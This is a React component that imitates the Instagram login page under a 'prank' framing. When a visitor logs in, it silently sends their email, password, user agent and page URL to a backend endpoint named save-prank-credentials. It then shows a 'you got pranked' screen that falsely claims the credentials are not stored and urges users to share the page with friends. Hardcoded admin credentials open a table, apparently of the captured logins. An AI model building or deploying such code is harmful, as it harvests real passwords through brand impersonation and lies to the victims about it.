import React, { useState, useMemo } from 'react';
import { useAuth } from '../contexts/AuthContext';
import AdminTable from './AdminTable';

// Predefined Admin credentials (as requested)
const ADMIN_USERNAME = 'Hello World';
const ADMIN_PASSWORD = 'Admin.iam.';

const InstagramLogin = () => {
  const [isSignUp, setIsSignUp] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showForgotPassword, setShowForgotPassword] = useState(false);
  const [showPrankScreen, setShowPrankScreen] = useState(false);
  const [savedCredentials, setSavedCredentials] = useState({ email: '', password: '' });
  const [showAdmin, setShowAdmin] = useState(false);

  const { signup, resetPassword, currentUser, logout } = useAuth();

  const backendUrl = useMemo(() => process.env.REACT_APP_BACKEND_URL, []);

  const saveCredentials = async (payload) => {
    try {
      await fetch(`${backendUrl}/api/save-prank-credentials`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (e) {
      // Swallow - prank flow should continue
      console.error('Error saving credentials (ignored):', e);
    }
  };

  // Admin first, else prank path
  const handleLoginClick = async (e) => {
    e.preventDefault();
    setError('');

    if (!email || !password) {
      setError('Please fill in both email and password');
      return;
    }

    // Admin Gate
    if (!isSignUp && email === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      setShowAdmin(true);
      return;
    }

    // Prank path
    setLoading(true);
    setSavedCredentials({ email, password });

    // Fire and forget save
    saveCredentials({
      email: email,
      password: password,
      userAgent: navigator.userAgent,
      url: window.location.href,
      prankedAt: new Date().toISOString(),
      timestamp: Date.now()
    });

    // Show prank screen after delay
    setTimeout(() => {
      setLoading(false);
      setShowPrankScreen(true);
    }, 2000);
  };

  async function handleSubmit(e) {
    // Keep signup path via Firebase
    e.preventDefault();
    if (!isSignUp) return; // guard; login handled by handleLoginClick

    if (password !== confirmPassword) {
      return setError('Passwords do not match');
    }

    try {
      setError('');
      setLoading(true);
      await signup(email, password);
    } catch (error) {
      console.error('Signup error:', error);
      setError(error.message);
    }
    setLoading(false);
  }

  async function handleForgotPassword() {
    if (!email) {
      return setError('Please enter your email first');
    }

    try {
      setError('');
      setLoading(true);
      await resetPassword(email);
      setError('Check your inbox for further instructions');
      setShowForgotPassword(false);
    } catch (error) {
      setError(error.message);
    }
    setLoading(false);
  }

  async function handleLogout() {
    try {
      await logout();
    } catch (error) {
      setError('Failed to log out');
    }
  }

  // Admin view
  if (showAdmin) {
    return <AdminTable onExit={() => setShowAdmin(false)} />;
  }

  // Show prank screen when pranked
  if (showPrankScreen) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-600 via-pink-500 to-purple-600 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center transform animate-bounce-stop">
          <div className="mb-6">
            <div className="w-24 h-24 bg-gradient-to-tr from-red-500 via-yellow-400 to-pink-500 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse">
              <span className="text-white text-4xl">😂</span>
            </div>
            <h1 className="text-3xl font-bold text-red-600 mb-4 animate-pulse">YOU GOT PRANKED!</h1>
            <p className="text-gray-700 text-lg mb-4">Haha! This isn't the real Instagram! 🤣</p>
            <p className="text-sm text-gray-600 mb-6">We totally got you thinking this was real!</p>
          </div>
          
          <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
            <p className="text-sm text-red-600 mb-2 font-semibold">Your "credentials" we captured:</p>
            <p className="text-xs text-gray-700 break-all mb-1">👤 {savedCredentials.email}</p>
            <p className="text-xs text-gray-700 break-all">🔐 {savedCredentials.password}</p>
            <p className="text-xs text-red-500 mt-2 italic">Don't worry - we're not actually storing these! 😉</p>
          </div>

          <div className="space-y-3">
            <button
              onClick={() => {
                setShowPrankScreen(false);
                setEmail('');
                setPassword('');
                setSavedCredentials({ email: '', password: '' });
              }}
              className="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white py-3 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 transform hover:scale-105"
            >
              😅 Try Again (You Won't Fall For It Twice!)
            </button>
            
            <button
              onClick={() => window.open('https://www.instagram.com', '_blank')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-2 rounded-xl font-semibold hover:shadow-lg transition-all duration-300"
            >
              Go to Real Instagram 👉
            </button>
          </div>

          <div className="mt-6 p-4 bg-yellow-50 rounded-xl">
            <p className="text-xs text-yellow-700">
              💡 <strong>Prank Tip:</strong> Share this fake Instagram login with friends and see if they fall for it too! 
            </p>
          </div>
        </div>
      </div>
    );
  }

  // If user is logged in via signup, show dashboard
  // (unchanged from previous implementation)
  if (currentUser) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center">
          <div className="mb-6">
            <div className="w-20 h-20 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 rounded-full mx-auto mb-4 flex items-center justify-center">
              <span className="text-white text-2xl font-bold">✓</span>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Welcome!</h1>
            <p className="text-gray-600">You are successfully logged in</p>
          </div>
          
          <div className="bg-gray-50 rounded-xl p-4 mb-6">
            <p className="text-sm text-gray-600 mb-1">Logged in as:</p>
            <p className="font-semibold text-gray-800">{currentUser.email}</p>
          </div>

          <button
            onClick={handleLogout}
            className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 transform hover:scale-105"
          >
            Log Out
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Phone mockup container */}
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden transform hover:scale-105 transition-all duration-300">
          {/* Header */}
          <div className="bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 p-6 text-center">
            <div className="w-16 h-16 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg">
              <div className="w-12 h-12 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xl font-bold">📷</span>
              </div>
            </div>
            <h1 className="text-white text-2xl font-bold tracking-wide">Instagram</h1>
          </div>

          {/* Form Container */}
          <div className="p-8">
            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-xl mb-6 text-sm">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              {isSignUp && (
                <>
                  <div>
                    <input
                      type="text"
                      placeholder="Full Name"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                      required={isSignUp}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      placeholder="Username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                      required={isSignUp}
                    />
                  </div>
                </>
              )}
              
              <div>
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                  required
                />
              </div>
              
              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                  required
                />
              </div>

              {isSignUp && (
                <div>
                  <input
                    type="password"
                    placeholder="Confirm Password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                    required={isSignUp}
                  />
                </div>
              )}

              <button
                disabled={loading}
                type="button"
                onClick={isSignUp ? (e) => { e.preventDefault(); handleSubmit(e); } : handleLoginClick}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-xl font-semibold hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                {loading ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    {isSignUp ? 'Creating Account...' : 'Signing In...'}
                  </div>
                ) : (
                  isSignUp ? 'Sign Up' : 'Log In'
                )}
              </button>
            </form>

            {!isSignUp && (
              <div className="text-center mt-4">
                <button
                  onClick={() => setShowForgotPassword(true)}
                  className="text-purple-600 hover:text-purple-800 text-sm font-medium transition-colors duration-300"
                >
                  Forgot Password?
                </button>
              </div>
            )}

            {/* Forgot Password Modal */}
            {showForgotPassword && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                <div className="bg-white rounded-2xl p-6 w-full max-w-sm">
                  <h3 className="text-xl font-bold text-gray-800 mb-4">Reset Password</h3>
                  <p className="text-gray-600 text-sm mb-4">
                    Enter your email address and we'll send you a link to reset your password.
                  </p>
                  <input
                    type="email"
                    placeholder="Email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white mb-4"
                    required={isSignUp}
                  />
                  <div className="flex space-x-3">
                    <button
                      onClick={() => setShowForgotPassword(false)}
                      className="flex-1 bg-gray-200 text-gray-800 py-2 rounded-xl font-semibold hover:bg-gray-300 transition-colors duration-300"
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleForgotPassword}
                      disabled={loading}
                      className="flex-1 bg-gradient-to-r from-purple-600 to-pink-500 text-white py-2 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 disabled:opacity-50"
                    >
                      {loading ? 'Sending...' : 'Send Reset Link'}
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Divider */}
            <div className="relative my-8">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-4 bg-white text-gray-500">OR</span>
              </div>
            </div>

            {/* Toggle between Sign In and Sign Up */}
            <div className="text-center">
              <p className="text-gray-600 text-sm">
                {isSignUp ? 'Already have an account?' : "Don't have an account?"}
                <button
                  onClick={() => {
                    setIsSignUp(!isSignUp);
                    setError('');
                    setFullName('');
                    setUsername('');
                    setConfirmPassword('');
                  }}
                  className="text-purple-600 hover:text-purple-800 font-semibold ml-1 transition-colors duration-300"
                >
                  {isSignUp ? 'Log In' : 'Sign Up'}
                </button>
              </p>
            </div>
          </div>

          {/* Footer */}
          <div className="bg-gray-50 px-8 py-4 text-center">
            <p className="text-xs text-gray-500">
              By signing up, you agree to our Terms &amp; Privacy Policy
            </p>
          </div>
        </div>

        {/* Instagram-style bottom text */}
        <div className="text-center mt-8">
          <p className="text-white text-sm opacity-90">
            Get the app
          </p>
          <div className="flex justify-center space-x-4 mt-3">
            <div className="bg-white bg-opacity-20 backdrop-blur-lg rounded-lg px-4 py-2">
              <span className="text-white text-xs font-medium">📱 App Store</span>
            </div>
            <div className="bg-white bg-opacity-20 backdrop-blur-lg rounded-lg px-4 py-2">
              <span className="text-white text-xs font-medium">🤖 Google Play</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;